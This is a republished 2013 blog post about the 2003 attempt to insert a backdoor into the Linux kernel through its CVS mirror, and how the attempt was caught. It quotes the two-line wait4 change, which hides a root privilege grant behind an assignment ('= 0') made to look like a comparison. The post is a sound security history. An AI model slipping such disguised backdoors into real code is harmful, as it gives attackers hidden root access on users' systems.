<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://freedom-to-tinker.com/2013/10/09/the-linux-backdoor-attempt-of-2003/">Original</a>
    <h1>The Linux Backdoor Attempt of 2003 (2013)</h1>
    
    <div id="readability-page-1" class="page"><div><p>Josh <a href="https://freedom-to-tinker.com/blog/kroll/software-transparency-debian-openssl-bug/">wrote</a> recently about a serious security bug that appeared in Debian Linux back in 2006, and whether it was really a backdoor inserted by the NSA.   (He concluded that it probably was not.)</p>
<p>Today I want to write about another <a href="https://lwn.net/Articles/57135/">incident</a>, in 2003, in which someone tried to backdoor the Linux kernel.   This one was definitely an attempt to insert a backdoor.  But we don’t know who it was that made the attempt—and we probably never will.</p>
<p>But some people didn’t like BitKeeper, so a second copy of the source code was kept so that developers could get the code via another code system called CVS.  The CVS copy of the code was a direct clone of the primary BitKeeper copy.</p>
<p>But on Nov. 5, 2003, Larry McVoy <a href="https://lwn.net/Articles/57137/">noticed</a> that there was a code change in the CVS copy that did not have a pointer to a record of approval.  Investigation showed that the change had never been approved and, stranger yet, that this change did not appear in the primary BitKeeper repository at all.  Further investigation determined that someone had apparently broken in (electronically) to the CVS server and inserted this change.</p>
<p>What did the change do?   This is where it gets really interesting.  The change modified the code of a Linux function called wait4, which a program could use to wait for something to happen.  Specifically, it added these two lines of code:</p>
<pre>if ((options == (__WCLONE|__WALL)) &amp;&amp; (current-&gt;uid = 0))
        retval = -EINVAL;
</pre>
<p>[Exercise for readers who know the C programming language: What is unusual about this code?   Answer appears below.]</p>
<p>A casual reading by an expert would interpret this as innocuous error-checking code to make wait4 return an error code when wait4 was called in a certain way that was forbidden by the documentation.   But a really careful expert reader would notice that, near the end of the first line, it said “= 0” rather than “== 0”.   The normal thing to write in code like this is “== 0”, which tests whether the user ID of the currently running code (current-&gt;uid) is equal to zero, without modifying the user ID.  But what actually appears is “= 0”, which has the effect of setting the user ID to zero.</p>
<p>Setting the user ID to zero is a problem because user ID number zero is the “root” user, which is allowed to do absolutely anything it wants—to access all data, change the behavior of all code, and to compromise entirely the security of all parts of the system. So the effect of this code is to give root privileges to any piece of software that called wait4 in a particular way that is supposed to be invalid.  In other words … it’s a classic backdoor.</p>
<p>This is a very clever piece of work.  It looks like innocuous error checking, but it’s really a back door.  And it was slipped into the code outside the normal approval process, to avoid any possibility that the approval process would notice what was up.</p>
<p>But the attempt didn’t work, because the Linux team was careful enough to notice that that this code was in the CVS repository without having gone through the normal approval process.  Score one for Linux.</p>
<p>Could this have been an NSA attack? Maybe. But there were many others who had the skill and motivation to carry out this attack. Unless somebody confesses, or a smoking-gun document turns up, we’ll never know.</p>
<p>[Post edited (2013-10-09) to correct the spelling of Larry McVoy’s name.]</p>
</div></div>
  </body>
</html>
